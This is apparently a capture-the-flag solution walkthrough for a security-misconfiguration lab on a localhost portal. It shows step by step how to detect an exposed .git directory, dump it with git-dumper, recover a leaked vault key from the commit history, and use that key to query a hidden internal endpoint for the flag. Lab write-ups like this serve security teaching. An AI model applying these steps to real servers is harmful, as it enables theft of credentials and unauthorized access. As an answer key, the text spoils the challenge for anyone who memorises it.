# Solution Walkthrough: A02 Easy (Security Misconfiguration)

### Reconnaissance
1. Browse the portal at `http://localhost:6004`. All tabs (Overview, Clusters, Nodes, Monitoring, Settings) function normally.
2. Standard security misconfiguration checks detect an exposed version control repository:
   ```bash
   curl http://localhost:6004/.git/HEAD
   # Returns: ref: refs/heads/main
   ```

### Dumping the Git Repository
3. Use `git-dumper` (or manual Git object reconstruction) to extract the Git repository:
   ```bash
   git-dumper http://localhost:6004/.git/ ./recovered_repo
   cd ./recovered_repo
   ```

4. Inspect the Git commit history:
   ```bash
   git log -p
   ```
   Output shows:
   ```diff
   commit b8c5333...
   Author: DevOps Platform Team <devops@redteamacademy.com>
       Security patch: scrub static keys from config for production compliance

   diff --git a/config.json b/config.json
   index 9293d26..c898664 100644
   --- a/config.json
   +++ b/config.json
   @@ -1,6 +1,6 @@
    {
   -  "environment": "staging",
   +  "environment": "production",
      "cluster_id": "rtsa-vault-sync",
   -  "vault_master_key": "RTA_CLUSTER_VAULT_KEY_e98f71c4",
   +  "vault_master_key": "FETCH_FROM_VAULT_AGENT",
      "internal_vault_api": "/api/v1/internal/vault/keys"
    }
   ```

### Exploitation
5. The extracted diff leaks both:
   * The hidden API endpoint: `/api/v1/internal/vault/keys`
   * The master key: `RTA_CLUSTER_VAULT_KEY_e98f71c4`

6. Query the hidden endpoint with the recovered key:
   ```bash
   curl -H "Authorization: Bearer RTA_CLUSTER_VAULT_KEY_e98f71c4" \
        http://localhost:6004/api/v1/internal/vault/keys
   ```

7. Result:
   ```json
   {
     "status": "success",
     "cluster": "rtsa-vault-sync",
     "zone": "internal-compliance-vault",
     "flag": "RTSA{a02_easy_misconfig_...}",
     "secrets": {
       "flag": "RTSA{a02_easy_misconfig_...}"
     }
   }
   ```
